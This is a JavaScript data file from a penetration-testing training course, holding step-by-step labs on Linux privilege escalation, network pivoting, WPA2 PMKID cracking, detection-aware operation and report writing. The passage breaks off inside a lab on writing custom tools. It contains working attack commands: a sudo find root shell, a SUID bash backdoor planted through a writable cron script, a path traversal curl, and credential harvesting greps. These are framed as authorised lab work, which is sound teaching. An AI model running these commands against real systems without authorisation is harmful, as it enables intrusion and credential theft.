/* ==========================================================================
   ZothPen — hands-on labs (part 2: labs 10-15). Appends to window.ZL.
   ========================================================================== */
window.ZL.push(

{ id:'lab-privesc', title:'Linux privilege escalation on a box you own', mod:'m09', diff:'hard', os:'linux', time:'90 min', xp:120,
  goal:'Land as an unprivileged user on your own lab Linux host and reach root through a real misconfiguration — systematically, not by luck.',
  scenario:'You have a shell as www-data on your lab Linux target. Everything from here is enumeration discipline: sudo rules, SUID, capabilities, cron, writable configs, credentials. Work the checklist in order and stop the moment you have root.',
  requires:['A Linux VM you own with an unprivileged foothold','linpeas, pspy, gtfobins access, sudo, getcap'],
  steps:[
    { t:'Establish the shell and the identity', why:'Every command from here should be reproducible in your notes. Start a transcript.', cmd:`id; whoami; hostname; uname -a
cat /etc/os-release | head -3
script -qc /bin/bash /dev/shm/zothpen-transcript.log   # or: exec > >(tee /dev/shm/notes.log) 2>&1`, out:'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux lab-target 6.1.0-13-amd64 #1 SMP' },
    { t:'Sudo rules first — ten seconds, most common win', why:'sudo -l is the highest-yield single command on any Linux box. Read every line, not just the first.', cmd:`sudo -l 2>&1 | tee /dev/shm/sudo-l.txt
sudo --version | head -2`, out:'User www-data may run the following commands on lab-target:\n    (root) NOPASSWD: /usr/bin/find' },
    { t:'Cross-reference each binary against GTFOBins', why:'A binary plus a way to pass it arbitrary arguments equals code execution. find, tar, less, vi, awk, python — the shape recurs everywhere.', cmd:`# For each binary in sudo -l, look up its "sudo" function:
#   https://gtfobins.github.io/gtfobins/find/#sudo
# The find entry gives you exactly this:
sudo find . -exec /bin/sh \\; -quit
id`, out:'uid=0(root) gid=0(root) groups=0(root)' },
    { t:'If sudo is a dead end, sweep SUID and capabilities', why:'SUID binaries run as their owner. An unusual binary in the SUID list is the classic escalation. Capabilities are the same idea, far less monitored.', cmd:`find / -perm -4000 -type f 2>/dev/null | sort | tee /dev/shm/suid.txt
getcap -r / 2>/dev/null | tee /dev/shm/caps.txt
# Compare against a baseline: which of these is NOT in a default Debian install?`, out:'/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/backup-runner   <- not a default binary' },
    { t:'Enumerate cron, timers and processes you did not start', why:'A root job executing a script you can write to is a root shell in two lines. pspy catches jobs that only exist for two seconds.', cmd:`cat /etc/crontab /etc/cron.d/* 2>/dev/null; systemctl list-timers --all | head
# pspy needs no root:
#   curl -L -o /dev/shm/pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x /dev/shm/pspy64 && /dev/shm/pspy64 -pf -i 1000`, out:'2026/10/24 12:04:01 CMD: UID=0 PID=4412 | /bin/sh -c /opt/backup/run.sh\n2026/10/24 12:04:02 FILE: UID=0  /opt/backup/run.sh' },
    { t:'Check writability of everything the privileged process touches', why:'The finding is not "a cron job exists". The finding is "the directory that job runs from is world-writable".', cmd:`ls -ld /opt/backup /opt/backup/run.sh
find / -xdev -type d -perm -0002 ! -path '*/proc/*' ! -path '*/sys/*' 2>/dev/null | head -20
test -w /opt/backup && echo "WRITABLE — cron script can be replaced"`, out:'drwxrwxrwx 2 root root 4096 /opt/backup\nWRITABLE — cron script can be replaced' },
    { t:'Exploit it and hold the shell long enough to prove it', why:'Sleeping root jobs are fine, but a root shell you can type in is what makes the report unambiguous.', cmd:`printf '%s\\n' '#!/bin/sh' 'cp /bin/bash /tmp/.rootsh' 'chmod 4755 /tmp/.rootsh' > /opt/backup/run.sh
chmod +x /opt/backup/run.sh
sleep 65            # wait one cron cycle
/tmp/.rootsh -p -c 'id; cp /bin/bash /tmp/.rs2; chmod 4755 /tmp/.rs2'`, out:'uid=0(root) gid=0(root)' },
    { t:'Hunt credentials before you finish — they outlive your shell', why:'Even with root on one box, credentials in configs give you the next box. And they are a finding the client must rotate.', cmd:`grep -rEi 'password|secret|token|api[_-]?key' /var/www /opt /etc /home 2>/dev/null | grep -v Binary | head -20
cat /home/*/.bash_history 2>/dev/null | grep -iE 'ssh|mysql|sudo|curl.*auth' | head -10`, out:'/var/www/app/.env:DB_PASSWORD=Tr0ub4dor&3\n/root/.my.cnf:password=Tr0ub4dor&3' },
    { t:'Clean up and write the chain', why:'Remove the SUID copy, the transcript stays, the finding is documented with the exact misconfiguration.', cmd:`rm -f /tmp/.rootsh /tmp/.rs2
cat > privesc-chain.md <<'EOF'
## Privilege escalation — root on lab-target
1. Foothold: www-data via web app RCE
2. Enumerated: sudo -l  ->  (root) NOPASSWD: /usr/bin/find
3. Exploited: sudo find . -exec /bin/sh \\; -quit  ->  root
4. Alternative path found and NOT used (kept for the report):
   /opt/backup world-writable + root cron running run.sh = root on next cycle
5. Credentials recovered: /var/www/app/.env DB_PASSWORD, /root/.my.cnf
## Remediation
- Remove the NOPASSWD find rule (use a wrapper script with fixed arguments)
- chmod 750 /opt/backup, chown root:root; move secrets out of the filesystem
- Rotate every credential listed above; DB account is shared (blast radius)
EOF
rm -f /tmp/.rootsh; wc -l privesc-chain.md`, out:'14 privesc-chain.md' }
  ],
  verify:[
    'You have root and can name the exact misconfiguration that gave it to you',
    'You enumerated all five classes: sudo, SUID, capabilities, cron, writable paths',
    'You identified at least one credential in a config file',
    'The escalation is written as a numbered chain with an explicit remediation per step'
  ],
  pitfalls:[
    'Reaching for a kernel exploit first. It is the most likely thing to crash the host and the least likely to be the intended path.',
    'Running linpeas and reading its 3,000 lines end to end. Run it with tee, then grep the categories you act on.',
    'Using a SUID-copy technique and forgetting to remove it. A world-readable root shell left on a client host is a backdoor you created.'
  ],
  hint:'Write the enumeration as a script once (id, sudo -l, uname, suid, caps, cron, ps, env, configs) and reuse it every time. Speed here is a matter of consistency, not cleverness.',
  tools:['t-linpeas','t-gtfobins','t-pspy','t-sudo-abuse','t-linux-privesc-doc'] },

{ id:'lab-pivot', title:'Pivot into an internal network and scan it properly', mod:'m10', diff:'hard', os:'kali', time:'90 min', xp:110,
  goal:'Turn one foothold into a route into an internal network, then scan it at full speed with correct tools — and stay in scope.',
  scenario:'Your lab has a second subnet (192.168.57.0/24) that your attacker machine cannot reach. You have a shell on 192.168.56.20, which has a foot in both. Get in, then get the picture.',
  requires:['Two lab subnets and one host with a leg in each','chisel or ligolo-ng, proxychains, nmap, socat'],
  steps:[
    { t:'Confirm the foothold\'s network position', why:'Before building a tunnel, know what the foothold can see. Reading its routes and interfaces tells you whether the internal network is even reachable from it.', cmd:`ip -brief addr; ip route
cat /etc/hosts; arp -an | head
# A second interface in 192.168.57.0/24 or a route to it is what makes this pivot possible.`, out:'eth0  UP  192.168.56.20/24\neth1  UP  192.168.57.20/24' },
    { t:'Pivot the modern way: ligolo-ng (layer 3)', why:'Routing beats proxying: real routes mean nmap -sS works at full speed and UDP is available.', cmd:`# Attacker (tmux pane 1):
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert
# On the foothold (drop the agent in /dev/shm):
#   ./agent -connect 192.168.56.10:11601 -ignore-cert
# In the proxy console:  session  ->  ifconfig  ->  start
sudo ip route add 192.168.57.0/24 dev ligolo`, out:'[Agent] Starting tunnel to 192.168.56.10:11601\n(session) >>> start' },
    { t:'Scan the internal network at full speed', why:'With a route you can do what SOCKS cannot: SYN scans, all ports, on the whole segment.', cmd:`sudo nmap -sn -n 192.168.57.0/24 -oG sweep57.gnmap
sudo nmap -sS -p- --min-rate 2000 -n -iL live57.txt -oA int-scan
grep -E '^[0-9]+/tcp\\s+open' int-scan.nmap | head -20`, out:'445/tcp  open  microsoft-ds\n5985/tcp open  wsman\n1433/tcp open  ms-sql-s' },
    { t:'Know the fallback: SOCKS with chisel', why:'When you cannot add a route (no root on your side, restricted environment), SOCKS is still enough for most protocols — you just have to accept the limits.', cmd:`# Attacker:   chisel server -p 8000 --reverse --auth u:p
# Foothold:   ./chisel client 192.168.56.10:8000 R:socks --auth u:p
# Then:
export ALL_PROXY=socks5://127.0.0.1:1080
proxychains4 -q nmap -sT -Pn -n -p445,5985,1433 192.168.57.25`, out:'445/tcp open  microsoft-ds (via proxy)' },
    { t:'Add a targeted port forward for interactive work', why:'SOCKS plus proxychains is awkward for a browser or a GUI tool. A direct forward makes one service feel local.', cmd:`# chisel: forward your localhost:8443 to the internal host's 443
#   ./chisel client 192.168.56.10:8000 R:8443:192.168.57.25:443
# or socat on the foothold:
socat TCP-LISTEN:8443,fork,reuseaddr TCP:192.168.57.25:443 &
curl -k -sI https://127.0.0.1:8443 | head -3`, out:'HTTP/1.1 401 Unauthorized' },
    { t:'Enumerate through the pivot', why:'The internal network is nearly always the softer one. Run the same enumeration you would on the edge.', cmd:`proxychains4 -q nxc smb 192.168.57.0/24 -u alice -p 'Password1' --shares
proxychains4 -q nxc winrm 192.168.57.0/24 -u alice -p 'Password1'
proxychains4 -q nxc mssql 192.168.57.25 -u alice -p 'Password1' --local-auth`, out:'WINRM  192.168.57.25  5985  INTRANET-APP  [+] LAB\\alice:Password1' },
    { t:'Watch your own tunnel scope', why:'A route into the client network removes the natural friction that keeps you in scope. State the boundary and check it before each command.', cmd:`# Scope reminder before every internal command:
cat ~/engagements/lab/scope.txt
#   IN SCOPE:   192.168.56.0/24, 192.168.57.0/24
#   OUT:        everything else, including 10.0.0.0/8
ip route | grep ligolo`, out:'192.168.57.0/24 dev ligolo scope link' },
    { t:'Tear the tunnel down and document', why:'A forgotten tunnel is a permanent route into the client network from your machine. Shut it down and log the profile.', cmd:`# In the proxy console: session -> stop ; then on the foothold kill the agent
sudo ip route del 192.168.57.0/24 dev ligolo; sudo ip link del ligolo
cat > pivot-log.md <<'EOF'
## Pivot profile
- Foothold: 192.168.56.20 (www-data) — dual-homed, eth1 in 192.168.57.0/24
- Method: ligolo-ng agent -> attacker, TUN "ligolo", route 192.168.57.0/24
- Fallback: chisel R:socks (used for the mssql enumeration)
- Internal findings: 445/5985/1433 open on .25; MSSQL reachable with domain creds
- Teardown: session stopped, agent removed from /dev/shm, route deleted on attacker
EOF
wc -l pivot-log.md`, out:'8 pivot-log.md' }
  ],
  verify:[
    'You can nmap -sS the internal subnet (not just -sT through a proxy)',
    'You enumerated at least one internal service with the same creds from the foothold',
    'Your scope file exists and the route is scoped to exactly the in-scope subnet',
    'pivot-log.md records how the tunnel was created and how it was torn down'
  ],
  pitfalls:[
    'Adding a wide route (/16 or a default) through the pivot "because it is easier". That is how you scan out-of-scope networks by accident.',
    'Running proxychains nmap with -sS and concluding the internal network is empty.',
    'Leaving a chisel/ligolo agent and a listener running after the engagement. Track every artefact you drop.'
  ],
  hint:'Run multiple tools through one ligolo tunnel simultaneously: it is a route, not a session. That is the practical difference from a SOCKS chain, where every tool competes for one proxied stream.',
  tools:['t-ligolo','t-chisel','t-proxychains','t-socat','t-ssh'] },

{ id:'lab-wireless', title:'Wireless assessment, safisfied with deauth-free capture', mod:'m11', diff:'hard', os:'kali', time:'90 min', xp:110,
  goal:'Survey a wireless environment, capture crackable material without disconnecting anyone, and write up the finding.',
  scenario:'You own the AP and the clients, or you are on a lab range with an AP you are authorised to test. Modern practice means PMKID capture, not a deauth storm. Learn the clean technique first, then understand what deauth adds and why you usually should not do it.',
  requires:['A monitor-mode-capable adapter (internal cards rarely work)','One AP you own and one client','aircrack-ng, hcxdumptool, hcxtools, hashcat'],
  steps:[
    { t:'Make sure the adapter supports monitor mode', why:'Half of all wireless frustration is an adapter that cannot do monitor mode. Check before you build a plan.', cmd:`iw dev
sudo iw list | grep -A8 'Supported interface modes' | grep -E 'monitor|managed'
sudo airmon-ng`, out:'* monitor\n	 * managed\nphy0  wlan0  rt2800usb  rtl8187' },
    { t:'Prepare the interface, killing the processes that fight you', why:'NetworkManager will reconnect and take the interface back mid-capture. airmon-ng check kill is not optional.', cmd:`sudo airmon-ng check kill
sudo airmon-ng start wlan0
iw dev | grep -A2 wlan0mon`, out:'Interface wlan0mon\ntype monitor' },
    { t:'Survey the environment', why:'You need the BSSID, channel, encryption and client count before anything. This is also the inventory for the report.', cmd:`sudo airodump-ng wlan0mon --write survey --output-format csv
sleep 30; kill %1 2>/dev/null
column -s, -t survey-01.csv 2>/dev/null | head -15`, out:'BSSID              CH  ENCR  ESSID\nAA:BB:CC:DD:EE:FF   6  WPA2  zothpen-lab' },
    { t:'Read the encryption flags properly', why:'WPA3/SAE and enforced PMF change everything: those networks are not crackable by handshake or PMKID capture. Say so and move on rather than grinding.', cmd:`grep -iE 'WPA3|SAE|MFP|PMF' survey-01.csv | head
# MFP REQUIRED means 802.11w is enforced -> deauth attacks fail AND PMKID is refused.
# Report it as a security strength, not a failure.`, out:'WPA2 WPA3 SAE  ...  MFP: REQUIRED' },
    { t:'Capture the PMKID passively — no client, no deauth', why:'This is the modern, non-disruptive technique: the AP itself hands over the material that lets you test the PSK.', cmd:`sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
# watch for:  PMKID ... FOUND   or   EAPOL ... FOUND
hcxpcapngtool -o hash.hc22000 -E essids.txt pmkid.pcapng
cat essids.txt; wc -l hash.hc22000`, out:'zothpen-lab\n1 hash.hc22000' },
    { t:'Understand what deauth would add — then do not do it', why:'Deauth forces a client to reconnect, which produces an EAPOL handshake on networks where PMKID is refused. It also disconnects real people. Know the trade-off explicitly.', cmd:`# Only against an AP you own and only with authorisation:
#   sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# Notes for the report:
#   - 3 frames is enough; 100 is antisocial and pointless
#   - each deauth is a DoS against a real client; log it as an action you took
echo "deauth NOT used — PMKID captured passively" | tee capture-notes.txt`, out:'deauth NOT used — PMKID captured passively' },
    { t:'Crack it with the right mode', why:'Mode 22000 is the unified WPA format. If the PSK is weak it falls fast; if it is strong, the honest answer is "not recoverable in the test window".', cmd:`hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --status --status-timer 10
hashcat -m 22000 hash.hc22000 --show`, out:'8846f7ea...:zothpenlab2024\nRecovered........: 1/1' },
    { t:'Check what else the environment exposes', why:'Wireless testing is not only about cracking the PSK. Rogue APs, open networks, WPS, and leaked traffic are findings too.', cmd:`# WPS enabled is a finding by itself:
grep -iE 'wps|wps:1' survey-01.csv | head
# Is there an open network? A client auto-connecting to one is the real risk:
grep -iE 'OPN|WEP' survey-01.csv | head
# Then the write-up: psk strength, WPS state, open networks, WPA3 coverage, PMF`, out:'zothpen-lab  WPS:1.0  (enabled — pixie-dust viable)' },
    { t:'Write the wireless finding', why:'A cracked PSK is both a technical and a policy finding. Give the client the fix, not just the result.', cmd:`cat > wireless-findings.md <<'EOF'
## Wireless assessment — zothpen-lab (AA:BB:CC:DD:EE:FF)
- Encryption: WPA2-PSK (+ WPA3 transition on the same SSID)
- Capture: PMKID, passive, no client and no deauthentication used
- Result: PSK recovered from rockyou + best64 rules in under 2 minutes
- WPS: enabled (1.0) -> pixie-dust viable, effectively bypasses PSK strength
- No rogue APs observed; no open networks on this channel
## Remediation
- Disable WPS; enforce WPA3-only (SAE) with PMF required on all APs
- Minimum 20-character passphrase, generated — not chosen
- Rotate the PSK now: assume it is known to anyone who can hear the AP
- Guest network must be separate VLAN with client isolation
EOF
wc -l wireless-findings.md`, out:'12 wireless-findings.md' }
  ],
  verify:[
    'Your adapter is in monitor mode and you killed the interfering processes',
    'You captured a PMKID or handshake without using deauthentication',
    'You converted the capture with hcxpcapngtool and cracked it with hashcat -m 22000',
    'wireless-findings.md reports WPS state and the encryption mode alongside the PSK result'
  ],
  pitfalls:[
    'Using deauth as the default technique. It disconnects real people and is a DoS — passive first, always.',
    'Capturing on channels without recording which AP the material came from, making the evidence unusable.',
    'Testing wireless without separate authorisation. RF testing is legislated differently in most jurisdictions.'
  ],
  hint:'If hcxdumptool reports nothing, do not assume the network is safe: some APs only send a PMKID on the first association. Try a targeted run with -c <channel> --bssid_list and leave it for a few minutes, or fall back to a handshake capture on a network you own.',
  tools:['t-aircrack','t-hcxtools','t-wifite','t-wireshark'] },

{ id:'lab-opsec', title:'Operating as the blue team is watching', mod:'m12', diff:'hard', os:'any', time:'60 min', xp:100,
  goal:'Run the same technique twice — once loudly and once with a lower-noise equivalent — and log what a defender would see each time.',
  scenario:'Your lab has a victim host logging to syslog or Windows Event Log. Do one noisy action and one quiet action with the same result, capture the evidence on the defender side, and write the detection notes. This is what turns a tool user into an operator.',
  requires:['Your lab target with logging enabled','nmap, netexec, impacket, chisel, and access to the target\'s logs'],
  steps:[
    { t:'Set up the observation point first', why:'You cannot measure detection after the fact. Start logging before the first action.', cmd:`# On the Linux target:
sudo apt install -y auditd rsyslog
sudo systemctl enable --now auditd
sudo journalctl -f -u auditd > /dev/shm/audit-watch.log &
# On the Windows target: enable and watch the relevant logs
#   wevtutil qe Security /c:20 /rd:true /f:text | head -40`, out:'follow: /dev/shm/audit-watch.log' },
    { t:'Action one: the loud way', why:'Metasploit/psexec-shaped actions create services, write binaries to disk and generate obvious process lineages. Do it and see.', cmd:`# On the lab target (authorised):
#   msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.56.20; run"
# On Linux, the loud equivalent: a psexec-style service or a dropped binary
nmap -sV -A -p- -T4 --script vuln 192.168.56.20 2>/dev/null | head
# Then read the defender's view:
sudo journalctl -u auditd --since '2 min ago' | tail -25`, out:'type=EXECVE msg=audit(...): argc=3 a0="nmap" a1="-sV" a2="-A"' },
    { t:'Note exactly what that looked like', why:'The goal is a concrete list, in the defender\'s words, not "it was noisy".', cmd:`cat > detection-notes.md <<'EOF'
## Action 1 — loud (baseline)
Method: nmap -sV -A -p- --script vuln, T4
Defender view (auditd/syslog):
  - mass connection attempts to every port, single source IP
  - 1000s of packets/second for ~40s -> trivial rate-based alert
  - indicator: connection count per source > threshold
Windows view: 4625 flood, service creation 7045, Sysmon process create for
  a binary in C:\\Windows\\Temp
EOF
wc -l detection-notes.md`, out:'8 detection-notes.md' },
    { t:'Action two: the same result, quieter', why:'Same objective, different trade-offs: fewer connections, normal-looking destinations, no dropped binary.', cmd:`# Slow, targeted, single port, no vuln scripts; connections across an hour
sudo nmap -sS -p 445 -T1 --max-rate 5 192.168.56.20 -oG quiet.gnmap
# And use an existing auth path instead of a dropped binary:
nxc smb 192.168.56.20 -u alice -p 'Password1' --shares >/dev/null
# Defender view:
sudo journalctl -u auditd --since '2 min ago' | wc -l`, out:'2' },
    { t:'Compare the two and be precise about the trade-off', why:'Quieter is not free: it is slower, it may fail, and "quieter" for one detector is louder for a statistical one. Say that honestly.', cmd:`cat >> detection-notes.md <<'EOF'

## Action 2 — same objective, lower noise
Method: single-port SYN scan at 5 pps + valid-credential SMB enumeration
Defender view: 2 auditd lines, no rate signal, no service creation
Cost: 40 minutes instead of 40 seconds; -T1 may miss transient services
Detection that WOULD still catch it:
  - statistical baseline ("normal SMB enumeration" vs new-source enumeration)
  - LDAP/SMB enumeration volume per account
  - presence of an unknown source IP on the management VLAN at all
## Honest conclusion
No technique is invisible. The real skill is choosing which detector you are
willing to trip, and documenting it.
EOF
tail -12 detection-notes.md`, out:'## Honest conclusion' },
    { t:'Build the defender\'s side of the story', why:'The deliverable of a red-team engagement is not a shell, it is a list of detections. Write the rules you would have needed.', cmd:`cat > detections-to-recommend.md <<'EOF'
1. Alert on >500 connections/minute from one internal source (catches nmap -T4).
2. Alert on SMB/RPC session setup for interactive scanning tooling
   (nxc/impacket: distinctive NegotiateProtocol + TreeConnect patterns).
3. Baseline and alert on new source IPs touching management ports (5985/22/3389).
4. Alert on Windows service creation (7045) of binaries outside Program Files.
5. Enable PowerShell script-block logging: catches the memory-only tooling that
   never touches disk (the only reliable way to see it).
6. Alert on scheduled tasks created with a RunLevel=Highest author.
EOF
wc -l detections-to-recommend.md`, out:'8 detections-to-recommend.md' },
    { t:'Clean up your noise', why:'Attackers leave logs; professionals leave the minimum. Delete your own artefacts, then check you actually did.', cmd:`rm -f /dev/shm/audit-watch.log quiet.gnmap
find / -newermt '-1 hour' -type f -not -path '/proc/*' -not -path '/sys/*' -not -path '/var/log/*' 2>/dev/null | head -20`, out:'(your own files only — anything else is a finding to report)' }
  ],
  verify:[
    'You captured log evidence of your own loud action on the defender side',
    'You reproduced the objective with a lower-noise method',
    'detection-notes.md names specific alertable events (numbers, log IDs), not adjectives',
    'detections-to-recommend.md has at least five rules a SOC could implement'
  ],
  pitfalls:[
    'Deciding a technique is "undetectable". Nothing is; the question is only which detector sees it.',
    'Turning off logging on the lab target to make your run tidy. The logging is the point of the lab.',
    'Forgetting that quieter techniques fail more often. Budget for retries, and record them.'
  ],
  hint:'The single highest-value defender recommendation is almost always PowerShell script-block logging and Sysmon with a decent configuration: it is the only practical way to see memory-only tooling, which is where modern red teams actually operate.',
  tools:['t-linpeas','t-impacket','t-metasploit','t-wireshark'] },

{ id:'lab-report', title:'Write the deliverable', mod:'m13', diff:'med', os:'any', time:'75 min', xp:100,
  goal:'Turn your lab notes into a professional report: executive summary, findings with reproducible evidence, and a fix order.',
  scenario:'You "tested" your lab across the previous fourteen labs and have a folder of raw output. Nobody pays for raw output. This lab converts it into the document that decides whether the work was valuable.',
  requires:['Your notes from the previous labs','pandoc, markdown, a text editor'],
  steps:[
    { t:'Structure the engagement folder', why:'Evidence discipline starts with a folder layout. If a file is not in the folder, it does not exist.', cmd:`mkdir -p ~/zothpen-report/{raw,evidence,findings}
mv ~/lab/*.md ~/lab/*.txt ~/zothpen-report/raw/ 2>/dev/null
ls -R ~/zothpen-report | head -20`, out:'raw/  evidence/  findings/' },
    { t:'Write the one-page executive summary first', why:'It is the page the decision-maker reads. Write it before the detail so it stays free of jargon.', cmd:`cat > report.md <<'EOF'
# Penetration test — lab range (192.168.56.0/24, 192.168.57.0/24)
Author: YOUR NAME        Dates: 2026-10-20 to 2026-10-24
Scope: the two subnets above, the lab VMs named in Appendix A.

## Executive summary
The lab range was fully compromised in under four hours. Three findings would
each allow an external attacker to reach internal systems, and one grants
domain administrator. The root causes are a public exploit in an unpatched web
server, guest-readable file shares containing a service credential, and a
certificate template that lets any domain user impersonate a domain admin.
All issues are configuration or patching problems with known fixes; a fix order
is in section 4.
EOF
wc -l report.md`, out:'14 report.md' },
    { t:'Write findings with reproducible evidence', why:'The standard: the reader pastes one command and sees what you saw. Anything less is unverifiable.', cmd:`mkdir -p findings
cat > findings/01-path-traversal.md <<'EOF'
## Finding 01 — Unauthenticated path traversal leading to RCE
Severity: Critical (CVSS 3.1 9.8, AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Affected: 192.168.56.30:80 (Apache httpd 2.4.49)
Description: Apache httpd 2.4.49 does not correctly normalise encoded path
  segments, allowing a request to escape the document root.
Evidence:
  curl -s --path-as-is "http://192.168.56.30/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" | head -3
  -> root:x:0:0:root:/root:/bin/bash   (file read proven)
  With mod-cgi enabled the same primitive executed a shell payload
  -> uid=33(www-data)   (RCE proven)
Impact: an unauthenticated attacker on the network gains code execution as www-data.
Remediation: upgrade httpd to >= 2.4.51 immediately; until then restrict cgi-bin
  and apply a WAF rule blocking encoded traversal. Verify with the curl above.
References: CVE-2021-41773, CWE-22
EOF
ls findings/ && grep -c '^## Finding' findings/01-path-traversal.md`, out:'01-path-traversal.md\n1' },
    { t:'Write the rest, including the negatives', why:'"We tested X and found nothing" is a real result and belongs in the report. It shows coverage and it manages expectations.', cmd:`cat > findings/02-credentials.md <<'EOF'
## Finding 02 — Guest-readable share exposes a service credential
Severity: High (CVSS 3.1 8.6)
Affected: 192.168.56.20 (WIN-TARGET), share \\\\SHARE
Evidence:
  nxc smb 192.168.56.20 -u guest -p '' --shares   -> SHARE  READ,WRITE
  smbclient -N //192.168.56.20/SHARE -c 'recurse ON; prompt OFF; mget *'
  cat creds.txt                                   -> svc_backup:Backup2024!
  nxc winrm 192.168.56.20 -u svc_backup -p 'Backup2024!'  -> (Pwn3d!)
Impact: any unauthenticated network user becomes a remote-management user.
Remediation: disable guest access to shares, remove credentials from scripts,
  rotate svc_backup, and audit share ACLs across the estate.
EOF
cat > findings/99-coverage.md <<'EOF'
## Coverage and negative results
- All 254 addresses in 192.168.56.0/24 ping-swept, 4 live, all scanned -p-.
- 192.168.57.0/24 reached via a pivot from 192.168.56.20 (see Appendix B).
- Wireless: not in scope for this engagement.
- Tested and found resistant: SMB signing enforced on INTRANET-APP (relay not viable);
  WPA3 with PMF required on the guest SSID; ESXi host patched, no viable path found.
- Time-limited: the password audit ran for 2 hours of GPU time; weak passwords
  may remain on accounts whose hashes were not extracted.
EOF
ls findings/`, out:'01-path-traversal.md  02-credentials.md  99-coverage.md' },
    { t:'Sort the findings into a fix order the client can execute', why:'A list of 20 findings is unactionable. A numbered fix order with the dependency chain is a plan.', cmd:`cat >> report.md <<'EOF'

## 4. Remediation priority
Class 1 (do today — assume compromise):
  1. Rotate svc_backup and every credential listed in Finding 02.
  2. Patch Apache (Finding 01) and verify with the supplied curl.
Class 2 (this week — removes the immediate path):
  3. Remove guest access from all shares; re-ACL against a documented model.
  4. Set Kerberos pre-authentication on all accounts lacking it.
Class 3 (this month — structural):
  5. Fix the AD CS template: disable "enrollee supplies subject", require approval.
  6. Password policy: 14+ chars, lockout 5/30min, ban common-password lists, MFA.
Class 4 (this quarter — detection):
  7. Implement the detection rules in Appendix C.
EOF
tail -8 report.md`, out:'## 4. Remediation priority' },
    { t:'Build the PDF and check it', why:'The deliverable is a file, not a folder. Build it, read it as a stranger would, and check the numbers.', cmd:`pandoc report.md findings/*.md -o lab-report.pdf \\
  --pdf-engine=xelatex --toc --number-sections -V geometry:margin=2cm \\
  -V mainfont='DejaVu Sans Mono' -V fontsize=10pt
grep -c '^## Finding' report.md findings/*.md | awk -F: '{s+=$2} END {print "findings:",s}'
ls -la lab-report.pdf`, out:'findings: 3\nlab-report.pdf  41231 bytes' },
    { t:'Write the credential-handling appendix', why:'It is the appendix that proves you were professional with the most sensitive data you held.', cmd:`cat > appendix-credentials.md <<'EOF'
# Appendix D — credential handling
Recovered during the test:
  - 3 Linux local account hashes (cracked: 3)
  - 1 service credential (svc_backup) from a share
  - 1 domain account hash (administrator) via DCSync
Storage: encrypted volume, engagement-only, access limited to the tester.
Not stored: no client data beyond the minimum proof required for each finding.
Destruction: scheduled for <date, 30 days after delivery>; certificate to follow.
Rotation required: all of the above, plus any account whose hash was extracted
  (assume every extracted hash is compromised, cracked or not).
EOF
ls appendix-credentials.md && echo "--- deliverable ready ---"`, out:'appendix-credentials.md' }
  ],
  verify:[
    'A PDF exists containing an executive summary, numbered findings and a fix order',
    'At least one finding has a single-command reproduction you have re-run yourself',
    'The coverage section states what was tested and found resistant',
    'The credential appendix names every recovered credential and the rotation requirement'
  ],
  pitfalls:[
    'Writing the report at the end from memory. Write findings as you go — you will not remember the request that proved the IDOR.',
    'Pasting scanner output into a finding. Extract the minimum that proves it; the rest is an appendix if at all.',
    'Treating "no findings" as "nothing to report": the coverage section and detection rules are valuable output of their own.'
  ],
  hint:'If pandoc PDF generation fights you on fonts, generate the DOCX instead (pandoc report.md -o report.docx) and let Word/LibreOffice produce the PDF. The structure is what matters; the engine is a detail.',
  tools:['t-markdown','t-legal','t-burp'] },

{ id:'lab-forge', title:'Forge your own tools', mod:'m14', diff:'hard', os:'kali', time:'90 min', xp:130,
  goal:'Write, test and install three scripts of your own: an enumeration wrapper, a parser, and a tool-customisation layer.',
  scenario:'Every expert pentester has a personal toolkit. Not a collection of downloaded tools — a small set of scripts that encode how they work. This lab builds that habit: three scripts, installed on your PATH, tested against your lab, and version-controlled.',
  requires:['Your Kali/Parrot VM and lab range','bash, python3, git, tmux'],
  steps:[
    { t:'Create the toolkit and put it under version control first', why:'A tool you cannot roll back is a liability. git init before the first script.', cmd:`mkdir -p ~/tools/bin && cd ~/tools
git init -q && printf 'bin/*.tmp\\n*.log\\nbh\\n' > .gitignore
echo 'export PATH="$HOME/tools/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc && which -a zothpen-recon 2>/dev/null; echo "toolkit at ~/tools"`, out:'toolkit at ~/tools' },
    { t:'Script one: a recon wrapper that does the boring sequence', why:'The first script every operator writes. It should be idempotent, log everything, and take one argument.', cmd:`cat > ~/tools/bin/zrecon <<'SH'
#!/usr/bin/env bash
# zrecon TARGET — scan, enumerate, rank. Logs to ./zrecon-TARGET-$(date +%s)/
set -euo pipefail
[ $# -ge 1 ] || { echo "usage: zrecon TARGET_OR_CIDR"; exit 2; }
T="$1"; TS="$(date +%Y%m%d-%H%M%S)"; D="zrecon-\${T//\\//_}-$TS"
mkdir -p "$D"; cd "$D"
exec > >(tee -a run.log) 2>&1
echo "[*] target=$T out=$PWD"
nmap -sn -n "$T" -oG sweep.gnmap | tail -2
grep -oE '^Host: [0-9.]+' sweep.gnmap | awk '{print $2}' | sort -u > hosts.txt
[ -s hosts.txt ] || { echo "[!] no live hosts"; exit 1; }
echo "[*] live: $(wc -l < hosts.txt)"
sudo nmap -p- --min-rate 2000 -T4 -n -iL hosts.txt -oG all.gnmap 2>/dev/null
grep -oE '[0-9]+/open/tcp' all.gnmap | cut -d/ -f1 | sort -un | paste -sd, > ports.txt
echo "[*] ports: $(cat ports.txt)"
sudo nmap -sV -sC -n -p "$(cat ports.txt)" -iL hosts.txt -oA svc 2>/dev/null || true
grep -E '^[0-9]+/tcp\\s+open' svc.nmap | awk '{print $1"  "$4"  "$5}' | sort -u | tee services.txt
echo "[+] done -> $PWD/services.txt"
SH
chmod +x ~/tools/bin/zrecon
zrecon 192.168.56.0/24 | tail -8`, out:'[*] live: 4\n[*] ports: 22,80,445,3306,5985\n[+] done -> zrecon-192.168.56.0_24-.../services.txt' },
